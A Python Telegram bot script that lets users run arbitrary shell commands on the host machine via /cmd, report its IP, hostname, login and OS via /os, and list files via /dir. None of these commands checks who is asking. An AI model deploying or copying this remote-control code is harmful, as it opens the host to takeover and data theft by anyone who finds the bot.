import util
import sql
import asyncio
import config
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage

logging.basicConfig(level=logging.WARNING, filename=config.LOG_FILENAME,filemode="w")

# Объект бота
bot = Bot(token=config.TG_TOKEN)

#loop = asyncio.get_event_loop()
storage = MemoryStorage()

# Диспетчер
dp = Dispatcher(bot, storage=storage)


db = sql.connect()




class Cmd (StatesGroup):
    command = State()

# Хэндлер на команду /start
@dp.message_handler(commands=['start', 'help'])
async def cmd_start(message: types.Message):
    await bot.send_message(731620137, text='Пользователь : '+str(message.from_user.id)+' подключился')
    sql.add_user(
        db,
        str(message.from_user.id),
        str(message.from_user.username),
        str(message.from_user.first_name)+str(message.from_user.last_name),
        'User',
        util.time()
    )
    print('Команда старт от', str(message.from_user.id))
    await message.answer('\n/cmd - выполнить команду\n/os - имя операционной системы\n/dir - окружение')

@dp.message_handler(commands=['os'])
async def cmd_go(message: types.Message):
     os_login = str(util.get_os_login())
     os = str(util.get_os())
     processor = str(util.get_processor())
     ip = str(util.mashine_ip())
     name = str(util.host_name())
     await bot.send_message(message.from_user.id, text='Имя машины : ' + name + '\nIP Адрес : ' + ip)
     await bot.send_message(message.from_user.id, text='Пользователь : '+os_login+
                                                       '\nОперационная система : '+os+'\n'+processor)


@dp.message_handler(commands=['cmd'])
async def cmd_go(message: types.Message):
     await bot.send_message(message.from_user.id, text='Введите команду :')
     await Cmd.command.set()

async def go_cmd(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    cmd_command = message.text
    await state.update_data(command=cmd_command)
    cmd_dict = await state.get_data()
    answer_cmd = util.use_cmd(str(cmd_dict['command']))
    await bot.send_message(user_id, text='команда \n'+str(cmd_dict['command'])+'\n выполнена в \n'+str(util.time()))
    await state.finish()
    for cmd_line in answer_cmd:
        util.write_file('\n'+str(cmd_line), config.DATA_FILE)
    print('File Done')
    cmd_data = str(util.read_file(config.DATA_FILE))
    await asyncio.sleep(7)
    await bot.send_message(user_id, text=cmd_data)
    print('File Delete')
    util.delite_file(config.DATA_FILE)

@dp.message_handler(commands=['dir'])
async def cmd_go(message: types.Message):
     dirc = util.dir()
     for file in dirc:
         await bot.send_message(message.from_user.id, text=str(file))
         await asyncio.sleep(1)




dp.register_message_handler(go_cmd, state=Cmd.command)
#Запуск процесса поллинга новых апдейтов
async def main():
        await dp.start_polling(bot)

    # Главная функция действия при старте
if __name__ == '__main__':
    util.start()
    sql.create_tables(db)
    asyncio.run(main())
